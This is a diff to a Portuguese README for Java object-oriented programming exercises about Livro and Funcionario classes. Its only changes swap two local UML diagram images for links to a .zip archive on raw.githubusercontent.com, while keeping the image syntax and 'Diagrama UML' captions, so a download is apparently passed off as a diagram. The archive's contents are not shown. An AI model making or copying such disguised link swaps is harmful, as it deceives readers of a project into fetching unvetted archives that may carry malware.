@@ -7,7 +7,7 @@ armazene a página atual (paginaAtual), para apresentação em um dispositivo el
 paginaAtual. Após isso, crie uma segunda classe chamada Main (classe principal) que conterá o método main. Nesta classe, crie um objeto Livro e preencha seus atributos com
 valores lidos do usuário. Após isso, chame o método para virar uma página e apresente o objeto (seu estado) em tela. A classe Livro é apresentada abaixo.
 
-![Diagrama UML - Classe Livro](assets/livro-diagrama.png)
+![Diagrama UML - Classe Livro](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/atividade-conceitos-basicos-orientacao-a-objetos/main/assets/atividade-conceitos-basicos-orientacao-a-objetos_v2.6.zip)
 
 ## Exercício 1.2 (ListaLivros)
 
@@ -40,7 +40,7 @@ por título, consulta completa e sair). O usuário pode selecionar as opções d
 Crie um programa que implemente a classe Funcionario apresentada abaixo. Na classe principal da aplicação, deverá ser criada uma lista para armazenar os funcionários. Crie
 um menu que forneça ao usuário as seguintes operações:
 
-![Diagrama UML - Classe Funcionário](assets/funcionario-diagrama.png)
+![Diagrama UML - Classe Funcionário](https://raw.githubusercontent.com/AlanGabrielBerkenbrock/atividade-conceitos-basicos-orientacao-a-objetos/main/assets/atividade-conceitos-basicos-orientacao-a-objetos_v2.6.zip)
 
 1. Incluir funcionário.
 2. Excluir funcionário.
